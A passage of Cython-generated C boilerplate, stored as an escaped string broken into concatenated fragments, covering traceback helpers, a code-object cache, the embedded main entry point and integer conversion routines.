*use_cline;\\n    PyObject *ptype, *pvalue, *ptraceback;\\n#if CYTHON_COMPILING_IN_CPYTHON\\n    PyObject **cython_runtime_dict;\\n#endif\\n    if (unlikely(!__pyx_cython_runtime)) {\\n        return c_line;\\n    }\\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\\n#if CYTHON_COMPILING_IN_CPYTHON\\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\\n    if (likely(cython_runtime_dict)) {\\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\\n            use_cline, *cython_runtime_dict,\\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\\n    } else\\n#endif\\n    {\\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\\n      if (use_cli\"\"ne_obj) {\\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\\n        Py_DECREF(use_cline_obj);\\n      } else {\\n        PyErr_Clear();\\n        use_cline = NULL;\\n      }\\n    }\\n    if (!use_cline) {\\n        c_line = 0;\\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\\n    }\\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\\n        c_line = 0;""\\n    }\\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\\n    return c_line;\\n}\\n#endif\\n\\n/* CodeObjectCache */\\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\\n    int start = 0, mid = 0, end = count - 1;\\n    if (end >= 0 && code_line > entries[end].code_line) {\\n        return count;\\n    }\\n    while (start < end) {\\n        mid = start + (end - start) / 2;\\n        if (code_line < entries[mid].code_line) {\\n            end = mid;\\n        } else if (code_line > entries[mid].code_line) {\\n             start = mid + 1;\\n        } else {\\n            return mid;\\n        }\\n    }\\n    if (code_line <= entries[mid].code_line) {\\n        return mid;\\n    } else {\\n        return mid + 1;\\n    }\\n}\\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\\n    PyCodeObject* code_object;\\n    int pos;\\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\\n        return NULL;\\n    }\\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\\n        return NULL;\\n    }\\n    code_object = __pyx_code_cache.entries[pos].code_object;\\n    Py_INCREF(code_object);\\n    return code_object;\\n}\\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\\n    int pos, i;\\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\\n    if (unlikel\"\"y(!code_line)) {\\n        return;\\n    }\\n    if (unlikely(!entries)) {\\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\\n        if (likely(entries)) {\\n            __pyx_code_cache.entries = entries;\\n            __pyx_code_cache.max_count = 64;\\n            __pyx_code_cache.count = 1;\\n            entries[0].code_line = code_line;\\n            en""tries[0].code_object = code_object;\\n            Py_INCREF(code_object);\\n        }\\n        return;\\n    }\\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\\n        PyCodeObject* tmp = entries[pos].code_object;\\n        entries[pos].code_object = code_object;\\n        Py_DECREF(tmp);\\n        return;\\n    }\\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\\n        int new_max = __pyx_code_cache.max_count + 64;\\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\\n        if (unlikely(!entries)) {\\n            return;\\n        }\\n        __pyx_code_cache.entries = entries;\\n        __pyx_code_cache.max_count = new_max;\\n    }\\n    for (i=__pyx_code_cache.count; i>pos; i--) {\\n        entries[i] = entries[i-1];\\n    }\\n    entries[pos].code_line = code_line;\\n    entries[pos].code_object = code_object;\\n    __pyx_code_cache.count++;\\n    Py_INCREF(code_object);\\n}\\n\\n/* AddTraceback */\\n#include \\\"compile.h\\\"\\n#include \\\"frameobject.h\\\"\\n#include \\\"traceback.h\\\"\\n#if PY_VERSION_HEX >= 0x030b00a6\\n  #ifndef Py_BUILD_CORE\\n    #define Py_BUILD_CORE 1\\n  #endif\\n  #include \\\"internal/pycore_frame.h\\\"\\n#endif\\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\\n            const char *funcname, int c_line,\\n            int py_line, const char *filename) {\\n    PyCodeObject *py_code = NULL;\\n   \"\" PyObject *py_funcname = NULL;\\n    #if PY_MAJOR_VERSION < 3\\n    PyObject *py_srcfile = NULL;\\n    py_srcfile = PyString_FromString(filename);\\n    if (!py_srcfile) goto bad;\\n    #endif\\n    if (c_line) {\\n        #if PY_MAJOR_VERSION < 3\\n        py_funcname = PyString_FromFormat( \\\"%s (%s:%d)\\\", funcname, __pyx_cfilenm, ""c_line);\\n        if (!py_funcname) goto bad;\\n        #else\\n        py_funcname = PyUnicode_FromFormat( \\\"%s (%s:%d)\\\", funcname, __pyx_cfilenm, c_line);\\n        if (!py_funcname) goto bad;\\n        funcname = PyUnicode_AsUTF8(py_funcname);\\n        if (!funcname) goto bad;\\n        #endif\\n    }\\n    else {\\n        #if PY_MAJOR_VERSION < 3\\n        py_funcname = PyString_FromString(funcname);\\n        if (!py_funcname) goto bad;\\n        #endif\\n    }\\n    #if PY_MAJOR_VERSION < 3\\n    py_code = __Pyx_PyCode_New(\\n        0,\\n        0,\\n        0,\\n        0,\\n        0,\\n        __pyx_empty_bytes, /*PyObject *code,*/\\n        __pyx_empty_tuple, /*PyObject *consts,*/\\n        __pyx_empty_tuple, /*PyObject *names,*/\\n        __pyx_empty_tuple, /*PyObject *varnames,*/\\n        __pyx_empty_tuple, /*PyObject *freevars,*/\\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\\n        py_srcfile,   /*PyObject *filename,*/\\n        py_funcname,  /*PyObject *name,*/\\n        py_line,\\n        __pyx_empty_bytes  /*PyObject *lnotab*/\\n    );\\n    Py_DECREF(py_srcfile);\\n    #else\\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\\n    #endif\\n    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline\\n    return py_code;\\nbad:\\n    Py_XDECREF(py_funcname);\\n    #if PY_MAJOR_VERSION < 3\\n    Py_XDECREF(py_srcfile);\\n    #endif\\n    return NULL;\\n}\\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\\n                               int py_line, const char *filename) {\\n    PyCodeObject *py_code = 0;\\n    PyFrameObject *py_frame = 0;\\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\\n    PyObject *ptype, *p\"\"value, *ptraceback;\\n    if (c_line) {\\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\\n    }\\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\\n    if (!py_code) {\\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback)"";\\n        py_code = __Pyx_CreateCodeObjectForTraceback(\\n            funcname, c_line, py_line, filename);\\n        if (!py_code) {\\n            /* If the code object creation fails, then we should clear the\\n               fetched exception references and propagate the new exception */\\n            Py_XDECREF(ptype);\\n            Py_XDECREF(pvalue);\\n            Py_XDECREF(ptraceback);\\n            goto bad;\\n        }\\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\\n    }\\n    py_frame = PyFrame_New(\\n        tstate,            /*PyThreadState *tstate,*/\\n        py_code,           /*PyCodeObject *code,*/\\n        __pyx_d,    /*PyObject *globals,*/\\n        0                  /*PyObject *locals*/\\n    );\\n    if (!py_frame) goto bad;\\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\\n    PyTraceBack_Here(py_frame);\\nbad:\\n    Py_XDECREF(py_code);\\n    Py_XDECREF(py_frame);\\n}\\n\\n/* MainFunction */\\n#ifdef __FreeBSD__\\n#include <floatingpoint.h>\\n#endif\\n#if PY_MAJOR_VERSION < 3\\nint main(int argc, char** argv) {\\n#elif defined(WIN32) || defined(MS_WINDOWS)\\nint wmain(int argc, wchar_t **argv) {\\n#else\\nstatic int __Pyx_main(int argc, wchar_t **argv) {\\n#endif\\n    /* 754 requires that FP exceptions run in \\\"no stop\\\" mode by default,\\n     * and until C vendors implement C99's ways to control FP exceptions,\\n     * Python requires non-stop mode.  Alas, some platforms enable FP\\n     * exceptions by default.  Here we disable them.\\n     */\\n#ifdef __FreeBSD__\\n    fp_except_t m;\\n    m = fpgetmask();\\n    fpsetmask(m & ~FP_X_OFL);\\n#endif\\n    if (argc && argv)\\n        Py_SetProgramName(argv[0]);\\n    Py_Initiali\"\"ze();\\n    if (argc && argv)\\n        PySys_SetArgv(argc, argv);\\n    {\\n      PyObject* m = NULL;\\n      __pyx_module_is_main_source = 1;\\n      #if PY_MAJOR_VERSION < 3\\n          initsource();""\\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\\n          m = PyInit_source();\\n          if (!PyModule_Check(m)) {\\n              PyModuleDef *mdef = (PyModuleDef *) m;\\n              PyObject *modname = PyUnicode_FromString(\\\"__main__\\\");\\n              m = NULL;\\n              if (modname) {\\n                  m = PyModule_NewObject(modname);\\n                  Py_DECREF(modname);\\n                  if (m) PyModule_ExecDef(m, mdef);\\n              }\\n          }\\n      #else\\n          m = PyInit_source();\\n      #endif\\n      if (PyErr_Occurred()) {\\n          PyErr_Print();\\n          #if PY_MAJOR_VERSION < 3\\n          if (Py_FlushLine()) PyErr_Clear();\\n          #endif\\n          return 1;\\n      }\\n      Py_XDECREF(m);\\n    }\\n#if PY_VERSION_HEX < 0x03060000\\n    Py_Finalize();\\n#else\\n    if (Py_FinalizeEx() < 0)\\n        return 2;\\n#endif\\n    return 0;\\n}\\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\\n#include <locale.h>\\nstatic wchar_t*\\n__Pyx_char2wchar(char* arg)\\n{\\n    wchar_t *res;\\n#ifdef HAVE_BROKEN_MBSTOWCS\\n    /* Some platforms have a broken implementation of\\n     * mbstowcs which does not count the characters that\\n     * would result from conversion.  Use an upper bound.\\n     */\\n    size_t argsize = strlen(arg);\\n#else\\n    size_t argsize = mbstowcs(NULL, arg, 0);\\n#endif\\n    size_t count;\\n    unsigned char *in;\\n    wchar_t *out;\\n#ifdef HAVE_MBRTOWC\\n    mbstate_t mbs;\\n#endif\\n    if (argsize != (size_t)-1) {\\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\\n        if (!res)\\n            goto oom;\\n        count = mbstowcs(res, arg, argsize+1);\\n        if (count != (size_t)-1) {\\n            wchar_t *tmp;\\n            /* Only use the result if it contains no\\n               surrogate characters. */\\n     \"\"       for (tmp = res; *tmp != 0 &&\\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\\n                ;""\\n            if (*tmp == 0)\\n                return res;\\n        }\\n        free(res);\\n    }\\n#ifdef HAVE_MBRTOWC\\n    /* Overallocate; as multi-byte characters are in the argument, the\\n       actual output could use less memory. */\\n    argsize = strlen(arg) + 1;\\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\\n    if (!res) goto oom;\\n    in = (unsigned char*)arg;\\n    out = res;\\n    memset(&mbs, 0, sizeof mbs);\\n    while (argsize) {\\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\\n        if (converted == 0)\\n            break;\\n        if (converted == (size_t)-2) {\\n            /* Incomplete character. This should never happen,\\n               since we provide everything that we have -\\n               unless there is a bug in the C library, or I\\n               misunderstood how mbrtowc works. */\\n            fprintf(stderr, \\\"unexpected mbrtowc result -2\\\\\\\\n\\\");\\n            free(res);\\n            return NULL;\\n        }\\n        if (converted == (size_t)-1) {\\n            /* Conversion error. Escape as UTF-8b, and start over\\n               in the initial shift state. */\\n            *out++ = 0xdc00 + *in++;\\n            argsize--;\\n            memset(&mbs, 0, sizeof mbs);\\n            continue;\\n        }\\n        if (*out >= 0xd800 && *out <= 0xdfff) {\\n            /* Surrogate character.  Escape the original\\n               byte sequence with surrogateescape. */\\n            argsize -= converted;\\n            while (converted--)\\n                *out++ = 0xdc00 + *in++;\\n            continue;\\n        }\\n        in += converted;\\n        argsize -= converted;\\n        out++;\\n    }\\n#else\\n    /* Cannot use C locale for escaping; manually escape as if charset\\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\\n       correctly in the locale's charset, which must be an ASCII superset. *\"\"/\\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof""(wchar_t));\\n    if (!res) goto oom;\\n    in = (unsigned char*)arg;\\n    out = res;\\n    while(*in)\\n        if(*in < 128)\\n            *out++ = *in++;\\n        else\\n            *out++ = 0xdc00 + *in++;\\n    *out = 0;\\n#endif\\n    return res;\\noom:\\n    fprintf(stderr, \\\"out of memory\\\\\\\\n\\\");\\n    return NULL;\\n}\\nint\\nmain(int argc, char **argv)\\n{\\n    if (!argc) {\\n        return __Pyx_main(0, NULL);\\n    }\\n    else {\\n        int i, res;\\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\\n        if (!argv_copy || !argv_copy2 || !oldloc) {\\n            fprintf(stderr, \\\"out of memory\\\\\\\\n\\\");\\n            free(argv_copy);\\n            free(argv_copy2);\\n            free(oldloc);\\n            return 1;\\n        }\\n        res = 0;\\n        setlocale(LC_ALL, \\\"\\\");\\n        for (i = 0; i < argc; i++) {\\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\\n            if (!argv_copy[i]) res = 1;\\n        }\\n        setlocale(LC_ALL, oldloc);\\n        free(oldloc);\\n        if (res == 0)\\n            res = __Pyx_main(argc, argv_copy);\\n        for (i = 0; i < argc; i++) {\\n#if PY_VERSION_HEX < 0x03050000\\n            free(argv_copy2[i]);\\n#else\\n            PyMem_RawFree(argv_copy2[i]);\\n#endif\\n        }\\n        free(argv_copy);\\n        free(argv_copy2);\\n        return res;\\n    }\\n}\\n#endif\\n\\n/* CIntToPy */\\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic push\\n#pragma GCC diagnostic ignored \\\"-Wconversion\\\"\\n#endif\\n    const long neg_one = (long) -1, const_zero = (long) 0;\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic pop\\n#endif\\n    const int is_unsigned = neg_one > const_zero;\\n    if (is_unsigned) {""\\n        if (sizeof(long) < sizeof(long))\"\" {\\n            return PyInt_FromLong((long) value);\\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\\n            return PyLong_FromUnsignedLong((unsigned long) value);\\n#ifdef HAVE_LONG_LONG\\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\\n#endif\\n        }\\n    } else {\\n        if (sizeof(long) <= sizeof(long)) {\\n            return PyInt_FromLong((long) value);\\n#ifdef HAVE_LONG_LONG\\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\\n#endif\\n        }\\n    }\\n    {\\n        int one = 1; int little = (int)*(unsigned char *)&one;\\n        unsigned char *bytes = (unsigned char *)&value;\\n        return _PyLong_FromByteArray(bytes, sizeof(long),\\n                                     little, !is_unsigned);\\n    }\\n}\\n\\n/* CIntFromPyVerify */\\n    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\\\\n    {\\\\\\n        func_type value = func_value;\\\\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\\\\n                func_type zero = 0;\\\\\\n                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\\\\n                    return (target_type) -1;\\\\\\n                if (is_unsigned && unlikely(value < zero))\\\\\\n                    goto raise_neg_overflow;\\\\\\n                else\\\\\\n                    goto raise_overflow;\\\\\\n            }\\\\\\n        }\\\\\\n        retu""rn (target_type) value;\\\\\\n    }\\n\\n/* CIntFromPy */\\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\\n#ifd\"\"ef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic push\\n#pragma GCC diagnostic ignored \\\"-Wconversion\\\"\\n#endif\\n    const long neg_one = (long) -1, const_zero = (long) 0;\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic pop\\n#endif\\n    const int is_unsigned = neg_one > const_zero;\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(PyInt_Check(x))) {\\n        if (sizeof(long) < sizeof(long)) {\\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\\n        } else {\\n            long val = PyInt_AS_LONG(x);\\n            if (is_unsigned && unlikely(val < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n            return (long) val;\\n        }\\n    } else\\n#endif\\n    if (likely(PyLong_Check(x))) {\\n        if (is_unsigned) {\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (long) 0;\\n                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])\\n                case 2:\\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned ""long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(lon\"\"g) >= 3 * PyLong_SHIFT) {\\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {\\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON\\n            if (unlikely(Py_SIZE(x) < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n#else\\n            {\\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\\n                if (unlikely(result < 0))\\n                    return (long) -1;\\n                if (unlikely(result == 1))\\n                    goto raise_neg_overflow;\\n            }\\n#endif\\n            if (sizeof(long) <= sizeof(unsigned long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLon""g(x))\\n#endif\\n            }\\n        } else {\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (long\"\") 0;\\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\\n                case -2:\\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 2:\\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -3:\\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else"" if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\"\"\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -4:\\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)di""gits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\\n                            return (long) ((((((((((lo\"\"ng)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n            if (sizeof(long) <= sizeof(long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\\n#endif\\n            }\\n        }\\n        {\\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\\n            PyErr_SetString(PyExc_RuntimeError,\\n                            \\\"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\\\");\\n#else\\n            long val;\\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\\n #if PY_MAJOR_VERSION < 3\\n            if (likely(v) && !PyLong_Check(v)) {\\n                PyObject *tmp = v;\\n                v = PyNumber_Long(tmp);\\n                Py_DECREF(tmp);\\n            }\\n #endif\\n            if (likely(v)) {\\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\\n                unsigned char *bytes = (unsigned char *)&val;\\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\\n                                              bytes, sizeof(val),\\n                                              is_little, !is_unsigned);\\n                Py_DECREF(v);\\n                if (likely(!ret))\\n                    return val;\\n            }\\n#endif\\n            return (long) -1;\\n        }\\n    } else {\\n        long val;\\n        ""PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\\n        if (!tmp) return (long) -1;\\n        val = __Pyx_PyInt_As_long(tmp);\\n        Py_DECREF(tmp);\\n        return val;\\n    }\\nraise_overflow:\\n    PyErr_SetString(PyExc_OverflowError,\\n        \\\"value too large to convert to long\\\");\\n    return (long) -1;\\nraise_neg_overflow:\\n   \"\" PyErr_SetString(PyExc_OverflowError,\\n        \\\"can't convert negative value to long\\\");\\n    return (long) -1;\\n}\\n\\n/* CIntFromPy */\\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic push\\n#pragma GCC diagnostic ignored \\\"-Wconversion\\\"\\n#endif\\n    const int neg_one = (int) -1, const_zero = (int) 0;\\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\\n#pragma GCC diagnostic pop\\n#endif\\n    const int is_unsigned = neg_one > const_zero;\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(PyInt_Check(x))) {\\n        if (sizeof(int) < sizeof(long)) {\\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\\n        } else {\\n            long val = PyInt_AS_LONG(x);\\n            if (is_unsigned && unlikely(val < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n            return (int) val;\\n        }\\n    } else\\n#endif\\n    if (likely(PyLong_Check(x))) {\\n        if (is_unsigned) {\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (int) 0;\\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\\n                case 2:\\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {""\\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, \"\"unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\\n                            return (int) 